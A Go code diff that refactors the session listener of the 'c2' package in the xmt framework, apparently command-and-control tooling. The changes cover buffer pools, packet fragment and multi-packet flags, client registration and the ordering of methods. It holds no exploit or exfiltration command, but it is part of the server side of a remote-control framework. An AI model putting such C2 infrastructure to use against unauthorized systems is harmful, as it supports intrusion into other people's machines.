@@ -13,6 +13,7 @@ import (
 	"github.com/iDigitalFlame/xmt/xmt/c2/transform"
 	"github.com/iDigitalFlame/xmt/xmt/c2/wrapper"
 	"github.com/iDigitalFlame/xmt/xmt/com"
+	"github.com/iDigitalFlame/xmt/xmt/com/limits"
 	"github.com/iDigitalFlame/xmt/xmt/device"
 	"github.com/iDigitalFlame/xmt/xmt/util"
 )
@@ -28,13 +29,13 @@ var (
 
 	bufs = &sync.Pool{
 		New: func() interface{} {
-			return make([]byte, DefaultBufferSize)
+			return make([]byte, limits.MediumLimit())
 		},
 	}
 	buffers = &sync.Pool{
 		New: func() interface{} {
 			return &buffer{
-				buf:  make([]byte, 0, DefaultBufferSize),
+				buf:  make([]byte, 0, limits.LargeLimit()),
 				rbuf: make([]byte, 8),
 			}
 		},
@@ -46,7 +47,7 @@ var (
 // the listener and setting callback functions to be used when a client
 // connect, registers or disconnects.
 type Handle struct {
-	Mux        Mux
+	Mux        Scheduler
 	Wrapper    wrapper.Wrapper
 	Oneshot    func(*Session, *com.Packet)
 	Receive    func(*Session, *com.Packet)
@@ -61,7 +62,7 @@ type Handle struct {
 	close      chan uint32
 	cancel     context.CancelFunc
 	sessions   map[uint32]*Session
-	listener   net.Listener //com.Listener
+	listener   net.Listener
 	controller *Server
 }
 type buffer struct {
@@ -83,7 +84,7 @@ func (h *Handle) listen() {
 	h.controller.Log.Trace("[%s] Starting listen \"%s\"...", h.name, h.listener)
 	for h.ctx.Err() == nil {
 		if len(h.close) > 0 {
-			for x := 0; x < len(h.close); x++ {
+			for x := 0; len(h.close) > 0; x++ {
 				v := <-h.close
 				if h.Disconnect != nil {
 					h.controller.events <- &callback{
@@ -143,31 +144,6 @@ func (h *Handle) String() string {
 func (h *Handle) IsActive() bool {
 	return h.ctx.Err() == nil
 }
-
-// Remove removes and closes the Session and releases all
-// it's associated resources.  This does not close the
-// Session on the client's end, use the Shutdown function on
-// the Session to shutdown the client process.
-func (h *Handle) Remove(i device.ID) {
-	h.close <- i.Hash()
-}
-
-// Sessions returns an array of all the current Sessions connected
-// to this Handle.
-func (h *Handle) Sessions() []*Session {
-	l := make([]*Session, 0, len(h.sessions))
-	for _, v := range h.sessions {
-		l = append(l, v)
-	}
-	return l
-}
-
-// Context returns the current Handle's context.
-// This function can be useful for canceling running
-// processes when this handle closes.
-func (h *Handle) Context() context.Context {
-	return h.ctx
-}
 func (h *Handle) session(c net.Conn) {
 	defer c.Close()
 	p, err := read(c, h.Wrapper, h.Transform)
@@ -208,11 +184,11 @@ func (h *Handle) session(c net.Conn) {
 		return
 	}
 	var i, t uint16
-	m := &com.Packet{ID: MsgMultiple}
+	m := &com.Packet{ID: MsgMultiple, Flags: com.FlagMulti | com.FlagMultiDevice}
 	for ; i < n; i++ {
 		v := &com.Packet{}
 		if err := v.UnmarshalStream(p); err != nil {
-			h.controller.Log.Warning("[%s:%s] %s: Received an error when attempting to read a Packet from \"%s\"! (%s)", h.name, p.Device, c.RemoteAddr().String(), err.Error())
+			h.controller.Log.Warning("[%s:%s] %s: Received an error when attempting to read a Packet! (%s)", h.name, p.Device, c.RemoteAddr().String(), err.Error())
 			return
 		}
 		if v.Flags&com.FlagOneshot != 0 {
@@ -238,12 +214,36 @@ func (h *Handle) session(c net.Conn) {
 	p.Close()
 	m.Close()
 	m.Flags.SetFragTotal(t)
-	m.Flags = m.Flags | com.FlagMulti | com.FlagMultiDevice
 	h.controller.Log.Trace("[%s:%s] %s: Sending Packet \"%s\" to client.", h.name, p.Device, c.RemoteAddr().String(), m.String())
 	if err := write(c, h.Wrapper, h.Transform, m); err != nil {
 		h.controller.Log.Warning("[%s:%s] %s: Received an error writing data to client! (%s)", h.name, p.Device, c.RemoteAddr().String(), err.Error())
 		return
 	}
+}
+
+// Remove removes and closes the Session and releases all
+// it's associated resources.  This does not close the
+// Session on the client's end, use the Shutdown function on
+// the Session to shutdown the client process.
+func (h *Handle) Remove(i device.ID) {
+	h.close <- i.Hash()
+}
+
+// Sessions returns an array of all the current Sessions connected
+// to this Handle.
+func (h *Handle) Sessions() []*Session {
+	l := make([]*Session, 0, len(h.sessions))
+	for _, v := range h.sessions {
+		l = append(l, v)
+	}
+	return l
+}
+
+// Context returns the current Handle's context.
+// This function can be useful for canceling running
+// processes when this handle closes.
+func (h *Handle) Context() context.Context {
+	return h.ctx
 }
 
 // Session returns the session that matches the specified
@@ -360,7 +360,11 @@ func process(h *Handle, s *Session, p *com.Packet) error {
 				return nil
 			}
 		}
-		return ErrInvalidPacketID
+		if p.ID == MsgRegister {
+			p.Device = s.Device.ID
+		} else {
+			return ErrInvalidPacketID
+		}
 	}
 	if h != nil && p.Flags&com.FlagOneshot != 0 {
 		if h.Oneshot != nil {
@@ -381,7 +385,7 @@ func process(h *Handle, s *Session, p *com.Packet) error {
 		return nil
 	}
 	switch p.ID {
-	case MsgPing, MsgHello, MsgSleep, MsgShutdown, MsgRegister:
+	case MsgPing, MsgHello, MsgSleep, MsgShutdown:
 		if p.Flags&com.FlagData == 0 {
 			return nil
 		}
@@ -394,7 +398,7 @@ func process(h *Handle, s *Session, p *com.Packet) error {
 		}
 	}
 	switch {
-	case p.Flags&com.FlagData != 0:
+	case p.Flags&com.FlagData != 0 && p.Flags&com.FlagMulti == 0 && p.Flags&com.FlagFrag == 0:
 		v := &com.Packet{}
 		if err := v.UnmarshalStream(p); err != nil {
 			return err
@@ -418,10 +422,11 @@ func process(h *Handle, s *Session, p *com.Packet) error {
 		return nil
 	case p.Flags&com.FlagFrag != 0 && p.Flags&com.FlagMulti == 0:
 		if p.Flags.FragTotal() == 0 {
+			// wrapped frags getting reset
 			return ErrInvalidPacketCount
 		}
 		if p.Flags.FragTotal() == 1 {
-			p.Flags = 0
+			p.Flags.ClearFrag()
 			process(h, s, p)
 			return nil
 		}
@@ -435,7 +440,8 @@ func process(h *Handle, s *Session, p *com.Packet) error {
 			return err
 		}
 		if uint16(c.Len()) >= c.Flags.FragTotal() {
-			processFully(h, s, c)
+			c.Flags.ClearFrag()
+			process(h, s, c)
 			delete(s.frags, g)
 		}
 		return nil
@@ -482,7 +488,7 @@ func (h *Handle) client(c net.Conn, p *com.Packet) *Session {
 			h.controller.Log.Warning("[%s:%s] %s: Received an error reading data from client! (%s)", h.name, s.ID, c.RemoteAddr().String(), err.Error())
 			return nil
 		}
-		h.controller.Log.Trace("[%s:%s] %s: Received client device info: (OS: %s, %s).", h.name, s.ID, c.RemoteAddr().String(), s.Device.OS.String(), s.Device.Version)
+		h.controller.Log.Trace("[%s:%s] %s: Received client device info: (OS: %s, %s).", h.name, s.ID, s.server, s.Device.OS.String(), s.Device.Version)
 		if p.Flags&com.FlagProxy == 0 {
 			s.send <- &com.Packet{ID: MsgRegistered, Device: p.Device, Job: p.Job}
 		}
